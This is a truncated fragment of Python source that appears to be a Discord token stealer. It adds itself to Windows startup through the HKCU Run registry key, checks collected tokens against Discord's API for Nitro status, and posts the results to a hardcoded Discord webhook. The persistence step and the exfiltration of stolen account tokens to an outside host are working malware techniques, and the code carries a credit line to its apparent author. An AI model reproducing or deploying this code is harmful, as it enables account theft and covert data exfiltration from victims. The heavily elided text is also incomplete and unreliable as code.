...
def add_to_startup():
    ...
    try:
        ...
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_SET_VALUE) as key:
            # Add the script to startup with a custom name
            winreg.SetValueEx(key, "MyProgram", 0, winreg.REG_SZ, script_path)
            print(f"Program added to startup: {script_path}")
            ...
            for value in checker:
                if value not in already_check:
                    ...
                    if res.status_code == 200:
                        ...
                        days_left = 0
                        if has_nitro:
                            # Check if nitro_data has content before accessing index 0
                            if len(nitro_data) > 0:
                                try:
                                    ...
                                    print(f"Key error while processing nitro data: {e}")
                            else:
                                print("No nitro data available")
...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1298656714966696017/biNo9gJHf3OfKltGCkABzobyot1qbL8snr_mP30XwepG8DX6cKtspoliUpsQQB5ToDv_', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except:
                            continue
                else:
